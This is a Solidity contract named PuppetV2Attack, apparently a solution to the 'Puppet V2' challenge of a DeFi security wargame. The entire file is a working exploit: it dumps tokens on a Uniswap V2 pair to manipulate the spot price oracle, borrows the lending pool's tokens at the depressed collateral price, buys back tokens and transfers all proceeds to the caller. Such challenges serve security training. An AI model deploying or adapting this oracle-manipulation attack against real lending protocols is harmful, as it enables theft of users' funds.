// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.6.0;
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "hardhat/console.sol";
import "./PuppetV2Pool.sol";
import "hardhat/console.sol";
interface IERC20Ex is IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IWETHEx is IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function withdraw(uint) external;
}
contract PuppetV2Attack {
    PuppetV2Pool private _puppetV2Pool;
    IUniswapV2Router02 private _uniswapV2Router02;
    IERC20Ex private _token;
    IWETHEx private _weth;
    address private _uniswapPair;
    address private _uniswapFactory;
    constructor(
        address puppetV2PoolAddress,
        address uniswapV2Router02Address,
        address wethAddress,
        address tokenAddress,
        address uniswapPairAddress,
        address uniswapFactoryAddress
        ) public
    {
        _puppetV2Pool = PuppetV2Pool(puppetV2PoolAddress);
        _uniswapV2Router02 = IUniswapV2Router02(uniswapV2Router02Address);
        _weth = IWETHEx(wethAddress);
        _token = IERC20Ex(tokenAddress);
        _uniswapPair = uniswapPairAddress;
        _uniswapFactory = uniswapFactoryAddress;
    }

    function start() public payable {
        _token.approve(address(_uniswapV2Router02), 2 ** 256 - 1);
        _weth.approve(address(_uniswapV2Router02), 2 ** 256 - 1);
        _weth.approve(address(_puppetV2Pool), 2**256 -1);

        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = address(_weth);
        _uniswapV2Router02.swapExactTokensForTokens(_token.balanceOf(address(this)), 1, path, address(this), block.timestamp *2);
        console.log("current own weth is %s", _weth.balanceOf(address(this)));
        uint256 secondAmount = 10 ** 5 * 10**18;
        _puppetV2Pool.borrow(secondAmount);
        console.log("current own weth is %s", _weth.balanceOf(address(this)));
        console.log("current token balance is %s", _token.balanceOf(address(this)));
        _uniswapV2Router02.swapExactTokensForTokens(_token.balanceOf(address(this)), 1, path, address(this), block.timestamp *2);
        console.log("current own weth is %s", _weth.balanceOf(address(this)));
        console.log("current token balance is %s", _token.balanceOf(address(this)));
        console.log(_puppetV2Pool.calculateDepositOfWETHRequired(10 ** 5 * 10**18)/ (10**18));
        console.log(_puppetV2Pool.calculateDepositOfWETHRequired(_token.balanceOf(address(_puppetV2Pool))) / (10**18));
        _puppetV2Pool.borrow(_token.balanceOf(address(_puppetV2Pool)));
        console.log("current token balance is %s", _token.balanceOf(address(this)));
        // last buy back token
        address[] memory reversalPath = new address[](2);
        reversalPath[0] = address(_weth);
        reversalPath[1] = address(_token);
        _uniswapV2Router02.swapTokensForExactTokens(secondAmount + 1, _weth.balanceOf(address(this)), reversalPath, address(this), block.timestamp * 2);

        _token.approve(address(_uniswapV2Router02), 0);
        _weth.approve(address(_uniswapV2Router02), 0);
        _weth.approve(address(_puppetV2Pool), 0);
        withdrawAll();
    }

    function withdrawAll() private {
        console.log("current own weth is %s", _weth.balanceOf(address(this)));
        console.log("current token balance is %s", _token.balanceOf(address(this)));
        _weth.withdraw(_weth.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
        _token.transfer(msg.sender, _token.balanceOf(address(this)));
    }

    receive() external payable {}


}
